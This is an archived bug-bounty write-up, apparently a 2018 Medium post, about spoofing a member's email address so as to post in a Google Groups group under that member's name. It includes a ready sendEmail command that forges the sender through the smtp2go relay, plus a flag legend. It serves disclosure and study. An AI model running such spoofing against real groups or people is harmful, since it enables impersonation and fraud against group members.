---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-04-18_google-bug-posting-on-groups-as-any-users-behalf.md
original_filename: 2018-04-18_google-bug-posting-on-groups-as-any-users-behalf.md
title: 'Google Bug: Posting on groups as any user’s behalf'
category: blogs
detected_topics:
- command-injection
- api-security
tags:
- imported
- blogs
- command-injection
- api-security
language: en
raw_sha256: 54635f0e73229d19981a6be88b4716b90a39219e7ea9db9793b8ba0a64b8f932
text_sha256: 7f4f477ee5309a51b7a5e38761c55ad4319929c3b74ef62da375607d2d871bf7
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# Google Bug: Posting on groups as any user’s behalf

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-04-18_google-bug-posting-on-groups-as-any-users-behalf.md
- Source Type: markdown
- Detected Topics: command-injection, api-security
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `54635f0e73229d19981a6be88b4716b90a39219e7ea9db9793b8ba0a64b8f932`
- Text SHA256: `7f4f477ee5309a51b7a5e38761c55ad4319929c3b74ef62da375607d2d871bf7`


## Content

---
title: "Google Bug: Posting on groups as any user’s behalf"
url: "https://medium.com/@newp_th/google-bug-posting-on-groups-as-any-users-behalf-c24e7f524be5"
authors: ["ssid (@newp_th)"]
programs: ["Google"]
bugs: ["Email spoofing"]
publication_date: "2018-04-18"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5908
scraped_via: "browseros"
---

# Google Bug: Posting on groups as any user’s behalf

Google Bug: Posting on groups as any user’s behalf
newp_th
Follow
1 min read
·
Apr 18, 2018

243

2

Google Groups is a service from Google that provides discussion groups for people sharing common interests.Today I will be sharing one of my finding in Google group.Using this issue an attacker could’ve post on any user’s behalf.

Note:

“Google Mail is vulnerable to e-mail spoofing so this made the attack easy”

Steps to reproduce
1. Search group where we want to post a new topic.
2. spoof e-mail using below command I used smtp2go server.

Get newp_th’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

sendEmail -f groupmember@gmail.com -t victim@googlegroups.com -u new topic -m mail -s mail.smtp2go.com:2525

f — victim email id
t — google group email
s — smtp server and port
I have already set IP authentication in smtp server which we don’t need authenticate using username and password

Refresh the group page and a post is made on victim’s behalf :”)

Timeline:

Reported: Aug 14,2017,6:24 PM

Google response: intended behavior!
